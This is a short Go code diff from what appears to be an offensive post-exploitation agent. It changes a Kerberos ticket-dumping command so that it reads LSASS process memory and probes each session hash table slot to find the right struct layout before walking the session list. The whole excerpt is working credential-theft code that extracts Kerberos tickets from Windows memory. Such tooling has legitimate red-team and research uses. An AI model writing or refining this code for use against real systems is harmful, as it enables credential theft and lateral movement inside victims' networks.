@@ -114,12 +114,17 @@ func executeKerbTicketsInner() structs.CommandResult {
 	reader := lsassRemoteReader{h: h}
 	sessLayout, tickLayout := selectKerbLayouts(0) // default to modern layout
 
-	// Probe the first session entry to auto-detect the correct struct layout.
-	// Windows cumulative updates can shift field offsets.
-	head, headErr := readListEntry(reader, tableAddr)
-	if headErr == nil && head.Flink != 0 && head.Flink != tableAddr {
+	// Probe the first session found in any hash table slot to auto-detect
+	// the correct struct layout.
+	for slot := 0; slot < kerbHashTableSlots; slot++ {
+		slotAddr := tableAddr + uintptr(slot*16)
+		head, headErr := readListEntry(reader, slotAddr)
+		if headErr != nil || head.Flink == 0 || head.Flink == slotAddr {
+			continue
+		}
 		probeBase := head.Flink - uintptr(sessLayout.ListEntryOff)
 		sessLayout = probeKerbSessionLayout(reader, probeBase, sessLayout)
+		break
 	}
 
 	sessions, err := walkKerbSessionList(reader, tableAddr, sessLayout)
